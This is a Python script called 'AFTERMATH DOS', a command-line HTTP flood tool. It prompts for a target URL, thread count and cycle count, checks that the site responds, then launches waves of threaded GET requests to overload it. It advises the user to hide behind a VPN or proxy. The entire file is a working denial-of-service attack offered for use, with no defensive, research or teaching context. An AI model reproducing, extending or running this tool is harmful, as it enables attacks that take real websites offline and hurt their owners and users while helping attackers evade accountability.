# AFTERMATH DOS
import os
import platform
import requests
from colorama import Fore, init
import threading
import time

init()
machine = platform.system()
print(Fore.LIGHTGREEN_EX + "Welcome to AFTERMATH DOS")
print(Fore.LIGHTYELLOW_EX + "Please use VPN or PROXY to protect your IP!")
print(Fore.LIGHTRED_EX + "Input URL:")
url = input(Fore.MAGENTA + ">>> ")
if machine == "Windows":
    print(Fore.LIGHTRED_EX + "Threads count(default:2048):")
    threads = input(Fore.YELLOW + ">>> ")
    print(Fore.LIGHTRED_EX + "Cycles count(default:20):")
    cycles = input(Fore.YELLOW + ">>> ")
elif machine == "Linux":
    print(Fore.LIGHTRED_EX + "Threads count(default:512):")
    threads = input(Fore.YELLOW + ">>> ")
    print(Fore.LIGHTRED_EX + "Cycles count(default:20):")
    cycles = input(Fore.YELLOW + ">>> ")
else:
    print(Fore.LIGHTRED_EX + "Unsupported platform! Exiting!")
    os.system('exit')


def Menu(thread=threads, cycle=cycles):
    if machine == "Windows":
        os.system("cls")
    elif machine == "Linux":
        os.system("clear")
    else:
        os.system("cls")

    if thread == "":
        if machine == "Windows":
            thread = 0
            threads1 = thread + 2048
        else:
            thread = 0
            threads1 = thread + 512
    else:
        threads1 = thread

    if cycle == "":
        cycle = 0
        cycle1 = cycle + 20
    else:
        cycle1 = cycle

    if url == "":
        Menu()
    else:
        test_responce(threads=threads1, cycle=cycle1)


def test_responce(threads, cycle):
    print(sep=Fore.LIGHTRED_EX + "          STARTING ATTACK")
    print(Fore.LIGHTRED_EX + "=====================================")
    print(Fore.LIGHTYELLOW_EX + "       SENDING TEST PACKET")
    t_r = requests.get(url)
    res = t_r.status_code
    if res == 200:
        print(Fore.LIGHTYELLOW_EX + "Response: " + str(res))
        print(Fore.LIGHTRED_EX + "=====================================")
    else:
        print(Fore.LIGHTRED_EX + "Addres not available, exiting!")
        os.system('exit')
    threading_start(thread=int(threads), cycles=int(cycle))


def threading_start(thread, cycles):
    x = 0
    while x <= cycles:
        for i in range(thread):
            th = threading.Thread(target=req)
            th.start()
            th.join(0.01)

        x += 1
        print(Fore.LIGHTRED_EX + "=====================================")
        print(Fore.LIGHTYELLOW_EX + "[" + str(x) + "]" + "Cycle completed!")
        print(Fore.LIGHTRED_EX + "=====================================")
        time.sleep(0.7)


def req():
    requests.get(url)
    print(Fore.LIGHTGREEN_EX + "[200]" + "Request sent on: " + url +" |")


Menu()
